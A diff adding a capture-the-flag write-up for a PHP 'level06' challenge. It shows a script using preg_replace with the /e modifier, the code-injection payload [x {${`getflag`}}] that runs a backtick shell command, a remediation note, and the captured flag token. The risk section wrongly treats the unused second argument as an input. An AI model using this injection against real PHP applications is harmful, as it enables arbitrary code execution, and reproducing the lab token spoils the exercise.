@@ -1,0 +1,44 @@
+level 06 :
+cat level06.php 
+#!/usr/bin/php
+<?php
+function y($m) {
+    $m = preg_replace("/\./", " x ", $m);
+    $m = preg_replace("/@/", " y", $m);
+    return $m;
+    }
+function x($y, $z) {
+    $a = file_get_contents($y);
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+    $a = preg_replace("/\[/", "(", $a);
+    $a = preg_replace("/\]/", ")", $a);
+    return $a;
+    }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+# TODO
+create a file to sent to level06 php executable in tmp
+[x {${`getflag`}}]
+./level06 /tmp/flag06
+
+test :
+sent [x {hello.world}] => {hello x world}
+
+debug_info : 
+- argv2 not use
+- [x ..] to cal first function function x($y, $z)
+- {${`getflag`}} use in function y($m) return with no change to file_get_contents
+
+risk :
+The /e modifier evaluates the replacement as PHP code, which can be a security risk if the input is not properly validated or sanitized.
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+
+If an attacker can control the input file or the second argument passed to the script ($argv[2]), they could potentially execute arbitrary PHP code within the y() function.
+This can lead to unauthorized code execution and pose a security risk.
+To mitigate this vulnerability, it is important to validate and sanitize user input before using it in such dynamic evaluation scenarios.
+You should carefully review and validate any input before passing it to functions like preg_replace with the /e modifier or executing it as code.
+It is generally recommended to use alternative approaches,
+such as using preg_replace_callback with a custom callback function, to achieve the desired functionality without introducing potential code injection vulnerabilities.
+
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
